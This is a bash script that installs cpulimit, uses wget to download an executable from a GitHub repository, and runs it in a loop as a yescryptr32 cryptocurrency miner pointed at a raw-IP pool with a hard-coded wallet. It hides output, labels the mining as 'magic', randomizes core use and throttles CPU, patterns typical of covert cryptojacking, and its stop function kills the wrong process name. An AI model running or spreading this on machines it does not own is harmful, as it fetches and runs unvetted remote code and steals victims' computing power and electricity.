#!/bin/bash

# Check if cpulimit is installed
if ! command -v cpulimit &> /dev/null; then
  echo "cpulimit not found. Installing via yum..."
  sudo yum install -y cpulimit
else
  echo "cpulimit is already installed"
fi

# Get the number of CPU cores
total_cores=$(nproc)

# Download the mining script
wget -O tmii https://github.com/barburonjilo/back/raw/main/sr

# Make the mining script executable
chmod +x tmii

# Function to generate the localized date string with core count
generate_worker() {
  local cores=$1
  TZ=":Asia/Jakarta" date '+%A-%d-%B-%Y' | sed \
    's/Monday/Senin/;s/Tuesday/Selasa/;s/Wednesday/Rabu/;s/Thursday/Kamis/;s/Friday/Jumat/;s/Saturday/Sabtu/;s/Sunday/Minggu/;s/January/Januari/;s/February/Februari/;s/March/Maret/;s/April/April/;s/May/Mei/;s/June/Juni/;s/July/Juli/;s/August/Agustus/;s/September/September/;s/October/Oktober/;s/November/November/;s/December/Desember/' \
    | sed "s/$/$cores/"
}

# Function to start the magic process with a random number of cores
start_magic() {
  local num_cores=$(( ( RANDOM % (total_cores - 1) ) + 1 ))  # Randomly choose between 1 and (total_cores - 1)
  local worker=$(generate_worker $num_cores)  # Generate worker string including core count

  # Limiting CPU usage to 40%
  local cpu_limit=2000
  
  # Start the mining process
  nohup ./tmii -a yescryptr32 --pool 45.115.225.129:8449 -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$worker --timeout 120 -t $num_cores > /dev/null 2>&1 &
  local pid=$!
  
  echo "Magic started with PID: $pid using $num_cores cores"

  # Limiting CPU usage using `cpulimit`
  cpulimit -p $pid -l $cpu_limit &
}

# Function to stop the magic process
stop_magic() {
  pkill -f sgq
  echo "Magic stopped"
}

# Run the loop
while true; do
  start_magic
  sleep 300  # Wait for 5 minutes
  stop_magic
  sleep 120  # Wait for 2 minutes
done
